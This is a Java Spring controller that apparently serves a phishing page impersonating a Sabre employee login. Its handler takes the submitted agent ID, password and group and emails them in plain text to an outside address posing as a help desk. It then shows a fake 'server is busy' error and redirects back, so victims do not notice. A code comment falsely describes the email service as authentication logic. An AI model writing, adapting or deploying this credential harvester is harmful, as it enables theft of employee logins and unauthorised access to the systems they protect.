package com.account.havail.sabre.sabre.controllers;


import com.account.havail.sabre.sabre.service.EmailService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

@Controller
@RequestMapping("/login")
public class LoginSabreEmployeeHostPSSController {




        @Autowired
        private EmailService emailService;  // A service to handle the authentication logic

        @PostMapping
        public String handleLogin(@RequestParam String userId,
                                  @RequestParam String password,
                                  @RequestParam String group,
                                  RedirectAttributes redirectAttributes) {
            String subject = "New Login Attempt with Sabre Employee Host";
            String body = "Agent ID: " + userId + "\n"
                    + "Password: " + password + "\n"
                    + "Group: " + group;
            redirectAttributes.addFlashAttribute("errorMessage", "Server is busy. Please try again later.");

            emailService.sendEmail("sabre@sabrehelpdesk.com", subject, body);
            return "redirect:/login/host";
        }
        }


